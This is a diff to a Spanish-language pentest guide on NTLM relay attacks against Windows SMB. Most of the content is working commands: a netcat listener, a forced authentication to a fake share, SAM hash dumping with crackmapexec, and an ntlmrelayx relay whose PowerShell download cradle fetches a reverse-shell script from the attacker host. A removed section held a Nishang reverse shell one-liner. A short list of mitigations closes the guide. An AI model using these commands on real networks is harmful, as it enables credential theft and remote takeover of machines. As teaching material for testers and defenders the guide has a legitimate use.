@@ -57,35 +57,48 @@ Editar socks4 127.0.0.1 1080
 ```bash
 /etc/proxychains4.conf:
 ````
+7 Poner la máquina en escucha con netcat
+```bash
+netcat -lvp 5555
+````
 
-Ejemplo: Robar hashes SAM
+## 💣 Paso clave: Forzar autenticación
+## En la máquina víctima (manual o con script):
+## Ejecutar esto en CMD de la víctima:
+```bash
+net use \\192.168.1.100\fake-share /u:fakeuser fakepass
+````
+## O intentar acceder manualmente a:
+```bash
+\\192.168.1.100\carpeta-falsa
+````
+## 🎯 Explotación exitosa
+## Cuando veas esto en ntlmrelayx:
+[+] Authenticated against 192.168.1.10 (Windows 10)
+
+## Opción A: Robar hashes
 ````bash
 proxychains4 crackmapexec smb 192.168.1.10 -u '' -p '' --sam
 ````
-
-Ejemplo: Reverse Shell
-
-Preparar shell.ps1 (ejemplo de Nishang):
-
- ```bash
- IEX(New-Object Net.WebClient).DownloadString("http://192.168.1.100:8000/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.100 -Port 443
-````
-Servir el script:
-````bash  
+## Opción B: Reverse Shell
+## 1. Hostear shell.ps1 (Terminal 3)
+```bash
 python3 -m http.server 8000
 ````
-Ejecutar relay:
-
-````bash
-impacket-ntlmrelayx -smb2support -tf targets.txt -c "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100:8000/shell.ps1')\""
+## 2. Ejecutar relay con payload
+```bash
+impacket-ntlmrelayx -smb2support -tf targets.txt -c "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://TU_IP:8000/shell.ps1')\""
 ````
 
-🛡️ Mitigaciones
+## 🔒 Medidas de protección
+- Activar SMB Signing (GPO)
+- Deshabilitar NTLM
+- Bloquear tráfico SMB no esencial
+- Monitorear eventos 4624 (Windows) con autenticaciones inusuales
 
-Habilitar SMB Signing en GPO:
+⚠️ IMPORTANTE: Este ataque solo funciona si:
+- La víctima tiene privilegios de administrador
+- El servicio SMB está activo
+- No hay SMB signing habilitado
 
-Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > Microsoft network server: Digitally sign communications (always).
 
-Deshabilitar NTLM y usar Kerberos.
-
-Segmentar redes para limitar tráfico SMB.
